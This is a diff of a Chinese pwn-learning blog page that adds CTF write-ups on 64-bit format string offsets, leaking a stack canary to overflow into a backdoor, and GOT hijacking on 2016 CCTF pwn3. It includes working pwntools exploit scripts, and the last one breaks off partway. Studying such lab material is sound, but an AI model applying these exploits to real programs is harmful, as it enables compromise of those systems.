@@ -356,7 +356,18 @@
             <li><a href="#覆盖内存">覆盖内存</a></li>
           </ol>
         </li>
-        <li><a href="#例子">例子</a></li>
+        <li><a href="#例子">例子</a>
+          <ol>
+            <li><a href="#64位的格式化字符串">64位的格式化字符串</a></li>
+            <li><a href="#绕过canary保护">绕过canary保护</a></li>
+            <li><a href="#hijack-got">hijack GOT</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#栈迁移">栈迁移</a>
+      <ol>
+        <li><a href="#32位栈迁移">32位栈迁移</a></li>
       </ol>
     </li>
   </ol>
@@ -435,7 +446,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 58 分钟
+                    阅读时长: 66 分钟
                 </time>
             </div>
         
@@ -5270,7 +5281,721 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="例子">例子
-</h3><p>​</p>
+</h3><h4 id="64位的格式化字符串">64位的格式化字符串
+</h4><p>64位格式化字符串和32位的很相似，做题的步骤也相同，唯一不同的是64位程序对函数参数存储的方式和32位的不同。</p>
+<p>也就是说前6个参数会存在寄存器中，所以我们计算偏移的时候要加上寄存器的长度才行</p>
+<p>比如例子中rdi存放的第一个参数，gdb调试出现flag在第4个位置，中间要加上rsi,rdx,rcx,r8,r9才是真正的偏移</p>
+<p>所以这里偏移5+4=9</p>
+<p>或者这里直接用pwngdb的工具<code>fmtarg</code>来判断</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gef➤  b <span class="nb">printf</span>
+</span></span><span class="line"><span class="cl">Breakpoint <span class="m">1</span> at 0x400640
+</span></span><span class="line"><span class="cl">gef➤  r
+</span></span><span class="line"><span class="cl">Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck 
+</span></span><span class="line"><span class="cl">what<span class="s1">&#39;s the flag
+</span></span></span><span class="line"><span class="cl"><span class="s1">123456
+</span></span></span><span class="line"><span class="cl"><span class="s1">You answered:
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">Breakpoint 1, __printf (format=0x602830 &#34;123456&#34;) at printf.c:28
+</span></span></span><span class="line"><span class="cl"><span class="s1">28  printf.c: 没有那个文件或目录.
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
+</span></span></span><span class="line"><span class="cl"><span class="s1">   0x7ffff7a627f7 &lt;fprintf+135&gt;    add    rsp, 0xd8
+</span></span></span><span class="line"><span class="cl"><span class="s1">   0x7ffff7a627fe &lt;fprintf+142&gt;    ret    
+</span></span></span><span class="line"><span class="cl"><span class="s1">   0x7ffff7a627ff                  nop    
+</span></span></span><span class="line"><span class="cl"><span class="s1"> → 0x7ffff7a62800 &lt;printf+0&gt;       sub    rsp, 0xd8
+</span></span></span><span class="line"><span class="cl"><span class="s1">   0x7ffff7a62807 &lt;printf+7&gt;       test   al, al
+</span></span></span><span class="line"><span class="cl"><span class="s1">   0x7ffff7a62809 &lt;printf+9&gt;       mov    QWORD PTR [rsp+0x28], rsi
+</span></span></span><span class="line"><span class="cl"><span class="s1">   0x7ffff7a6280e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x30], rdx
+</span></span></span><span class="line"><span class="cl"><span class="s1">───────────────────────────────────────────────────────────────────────[ stack ]────
+</span></span></span><span class="line"><span class="cl"><span class="s1">[&#39;</span>0x7fffffffdb08<span class="s1">&#39;, &#39;</span>l8<span class="err">&#39;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="m">8</span>
+</span></span><span class="line"><span class="cl">0x00007fffffffdb08│+0x00: 0x0000000000400890  →  &lt;main+234&gt; mov edi, 0x4009b8    ← <span class="nv">$rsp</span>
+</span></span><span class="line"><span class="cl">0x00007fffffffdb10│+0x08: 0x0000000031000001
+</span></span><span class="line"><span class="cl">0x00007fffffffdb18│+0x10: 0x0000000000602830  →  0x0000363534333231 <span class="o">(</span><span class="s2">&#34;123456&#34;</span>?<span class="o">)</span>
+</span></span><span class="line"><span class="cl">0x00007fffffffdb20│+0x18: 0x0000000000602010  →  <span class="s2">&#34;You answered:\ng&#34;</span>
+</span></span><span class="line"><span class="cl">0x00007fffffffdb28│+0x20: 0x00007fffffffdb30  →  <span class="s2">&#34;flag{11111111111111111&#34;</span>
+</span></span><span class="line"><span class="cl">0x00007fffffffdb30│+0x28: <span class="s2">&#34;flag{11111111111111111&#34;</span>
+</span></span><span class="line"><span class="cl">0x00007fffffffdb38│+0x30: <span class="s2">&#34;11111111111111&#34;</span>
+</span></span><span class="line"><span class="cl">0x00007fffffffdb40│+0x38: 0x0000313131313131 <span class="o">(</span><span class="s2">&#34;111111&#34;</span>?<span class="o">)</span>
+</span></span><span class="line"><span class="cl">──────────────────────────────────────────────────────────────────────────────<span class="o">[</span> trace <span class="o">]</span>────
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="c1">#0] 0x7ffff7a62800 → Name: __printf(format=0x602830 &#34;123456&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="c1">#1] 0x400890 → Name: main()</span>
+</span></span><span class="line"><span class="cl">─────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里直接拿字符串的地址来</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">fmtarg 0x00007fffffffdb28
+</span></span><span class="line"><span class="cl">The index of format argument : <span class="m">10</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于是0开始计数的，这里输入的payload为<code>%9$s</code></p>
+<h4 id="绕过canary保护">绕过canary保护
+</h4><blockquote>
+<p>canary简介：Canary是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs/gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上（最低位都是\x00），当函数结束时会检查这个栈上的值是否和存进去的值一致，若一致则正常退出，如果是栈溢出或者其他原因导致Canary的值发生变化，那么程序将执行___stack_chk_fail函数，继而终止程序。</p>
+<p>所以如果有一道题开启了canary保护，但不知道canary的值，就不能够进行ROP来劫持程序流程，那么这道题就无法解决了。</p>
+</blockquote>
+<p>然后绕过canary的方式</p>
+<blockquote>
+<p>1.爆破canary
+2.如果存在字符串格式化漏洞可以输出canary并利用溢出覆盖canary从而达到绕过
+这里我们采用第二种利用方法：printf 属于可变参数函数，函数调用者可任意指定参数和数量，这也是漏洞产生的原因。</p>
+</blockquote>
+<p>这里跟着cyberangel师傅的文章学习<a class="link" href="https://www.yuque.com/cyberangel/rg9gdm/kukf7u"  target="_blank" rel="noopener"
+    >PWN入门（2-1-5）-使用格式化字符串漏洞绕过Canary保护（32位ELF）</a></p>
+<p><img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313104633936.png"
+	width="483"
+	height="140"
+	srcset="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313104633936_hu5298577573633192549.png 480w, /p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313104633936_hu1329570180193721644.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313104633936"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="345"
+		data-flex-basis="828px"
+	
+></p>
+<p>进ida查看汇编</p>
+<p><img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313104927026.png"
+	width="433"
+	height="79"
+	srcset="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313104927026_hu17472986951786258642.png 480w, /p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313104927026_hu11344752241275049346.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313104927026"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="548"
+		data-flex-basis="1315px"
+	
+></p>
+<p><img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313104938193.png"
+	width="732"
+	height="195"
+	srcset="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313104938193_hu11153468333137632453.png 480w, /p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313104938193_hu13286645857013170094.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313104938193"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="375"
+		data-flex-basis="900px"
+	
+></p>
+<p>这里对gs的操作，说明确实开启了canary保护，然后看一下伪代码</p>
+<p><img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313105222119.png"
+	width="682"
+	height="284"
+	srcset="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313105222119_hu4835552044635640725.png 480w, /p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313105222119_hu2224285183069833863.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313105222119"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="240"
+		data-flex-basis="576px"
+	
+></p>
+<p>明显这里printf有格式化字符串漏洞，同时发现后门函数</p>
+<p><img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313105514989.png"
+	width="365"
+	height="114"
+	srcset="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313105514989_hu12677076842179754726.png 480w, /p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313105514989_hu7368507547976133502.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313105514989"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="320"
+		data-flex-basis="768px"
+	
+></p>
+<p>这里大概的思路就是先利用格式化字符串漏洞泄露出canary的值，现在开始调试，这里在printf下断点</p>
+<p><img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313110222964.png"
+	width="1715"
+	height="778"
+	srcset="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313110222964_hu8103334571015542570.png 480w, /p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313110222964_hu1825724854596943993.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313110222964"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="220"
+		data-flex-basis="529px"
+	
+></p>
+<p>其实这里就能确定第一个参数的偏移了，接下来我们在xor这里下断点，查看canary的偏移</p>
+<p><img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313110821841.png"
+	width="796"
+	height="151"
+	srcset="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313110821841_hu10723271973913583603.png 480w, /p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313110821841_hu7325044869960943511.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313110821841"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="527"
+		data-flex-basis="1265px"
+	
+></p>
+<p><img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313111030245.png"
+	width="1716"
+	height="794"
+	srcset="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313111030245_hu537127592354978992.png 480w, /p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313111030245_hu6290767258668693873.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313111030245"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="216"
+		data-flex-basis="518px"
+	
+></p>
+<p>直接看edx的值就行，这里看到<code>*EDX  0x64933300</code></p>
+<p>然后打印一下前面aaaa所在地址的内存</p>
+<p><img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313111728415.png"
+	width="1721"
+	height="796"
+	srcset="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313111728415_hu13472798047310571228.png 480w, /p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313111728415_hu7190492524328548390.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313111728415"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="216"
+		data-flex-basis="518px"
+	
+></p>
+<p>其实看stack也能看到是0x3c,也就是偏移是15，也就是我们第一次gets的时候发送<code>%15$x</code>就会泄露出canary的值</p>
+<p>然后我们开始确定第一次gets到canary的偏移，之前我们说过[esp+0x3c]即v5处存放Canary的随机参数，在IDA中我们分别进入v5和第一个&amp;s,发现其偏移0x28</p>
+<p><img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313113904699.png"
+	width="388"
+	height="69"
+	srcset="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313113904699_hu14493871126060897883.png 480w, /p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313113904699_hu16148688733516920996.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313113904699"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="562"
+		data-flex-basis="1349px"
+	
+></p>
+<p><img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313113912169.png"
+	width="486"
+	height="130"
+	srcset="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313113912169_hu14995784801985772887.png 480w, /p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313113912169_hu6358122708458188686.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313113912169"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="373"
+		data-flex-basis="897px"
+	
+></p>
+<p>接下来继续看上面的图</p>
+<p><img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313114316078.png"
+	width="846"
+	height="247"
+	srcset="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313114316078_hu3736531138597312779.png 480w, /p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260313114316078_hu9667491387295072569.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260313114316078"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="342"
+		data-flex-basis="822px"
+	
+></p>
+<p>这里我们已经知道ESP和EBP地址了，这里[esp+0x3c]就是v5的地址，那么v5相对于EBP的偏移就是EBP-v5，得到12</p>
+<p>exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./binary_200&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0x0804854D</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%15$x&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">Canary</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">Canary</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">12</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里简单说一下，第一次gets填满s数组，然后填入泄露出的canary的值，程序正常继续，接下来利用栈溢出，填12个字符到ebp，覆盖返回地址为后门函数</p>
+<h4 id="hijack-got">hijack GOT
+</h4><p>在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的。此外，在没有开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。</p>
+<p>假设我们将函数 A 的地址覆盖为函数 B 的地址，那么这一攻击技巧可以分为以下步骤</p>
+<ul>
+<li>
+<p>确定函数 A 的 GOT 表地址。</p>
+<ul>
+<li>这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。</li>
+</ul>
+</li>
+<li>
+<p>确定函数 B 的内存地址</p>
+<ul>
+<li>这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。</li>
+</ul>
+</li>
+<li>
+<p>将函数 B 的内存地址写入到函数 A 的 GOT 表地址处。</p>
+<ul>
+<li>
+<p>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种</p>
+<ul>
+<li>写入函数：write 函数。</li>
+<li>ROP</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pop eax; ret;           # printf@got -&gt; eax
+</span></span><span class="line"><span class="cl">pop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebx
+</span></span><span class="line"><span class="cl">add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>格式化字符串任意地址写</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>以2016CCTF的pwn3为例</p>
+<p><img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260319110332744.png"
+	width="471"
+	height="150"
+	srcset="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260319110332744_hu13850154499921578824.png 480w, /p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260319110332744_hu4516091610521460902.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260319110332744"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="314"
+		data-flex-basis="753px"
+	
+></p>
+<p>32位NX保护，确实没开RELRO保护，反编译</p>
+<p><img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260319110550853.png"
+	width="1032"
+	height="632"
+	srcset="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260319110550853_hu18207028236821336184.png 480w, /p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260319110550853_hu3270857999047762572.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260319110550853"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="163"
+		data-flex-basis="391px"
+	
+></p>
+<p><img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260319110925872.png"
+	width="854"
+	height="431"
+	srcset="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260319110925872_hu14431778142869835510.png 480w, /p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260319110925872_hu1137790468774214156.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260319110925872"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="198"
+		data-flex-basis="475px"
+	
+></p>
+<p>get_file函数这里存在格式化字符串漏洞,然后前面程序还要求密码正确，这个很简单，加个1的偏移就行，这里查看ida可以知道没有system和binsh的地址，需要泄露libc，这里用printf来泄露libc</p>
+<p>这里调试的话就要找这里的get_file中的printf</p>
+<p><img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260319112644440.png"
+	width="1261"
+	height="182"
+	srcset="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260319112644440_hu10300340728679985951.png 480w, /p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260319112644440_hu9472076348052930869.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260319112644440"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="692"
+		data-flex-basis="1662px"
+	
+></p>
+<p>在0x0804889E这里下断点，输入密码rxraclhm，选择put模式，先输入测试字符串，然后再用get进行调试，查看偏移</p>
+<p><img src="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260319113135062.png"
+	width="1716"
+	height="795"
+	srcset="/p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260319113135062_hu7081377236524822701.png 480w, /p/pwn%E8%8A%9D%E5%A3%AB%E5%AD%A6%E7%88%86/image-20260319113135062_hu1235023767155531990.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260319113135062"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="215"
+		data-flex-basis="518px"
+	
+></p>
+<p>得到偏移是7，这里想知道put@got的地址，所以构造payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%8$s&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里为了输出的前4个字符就是puts的地址，把地址放在后面，所以前面写的是8</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ldd pwn3
+</span></span><span class="line"><span class="cl">	linux-gate.so.1 <span class="o">(</span>0xea7fc000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xea5a3000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	/lib/ld-linux.so.2 <span class="o">(</span>0xea7ff000<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里知道本地libc地址是<code>/lib/i386-linux-gnu/libc.so.6</code>,接下来就可以准备覆盖puts函数地址为system，然后创建一个叫binsh的文件，那么调用<code>puts(s)</code>的时候就是调用<code>system(&quot;/bin/sh&quot;)</code>,puts函数位于show_dir函数里面</p>
+<p>最后得到exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span> <span class="p">(</span><span class="s1">&#39;/lib/i386-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Name (ftp.hacker.server:Rainism):&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;rxraclhm&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;put&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;please enter the name of the file you want to upload:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;123&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;then, enter the content:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%8$s&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
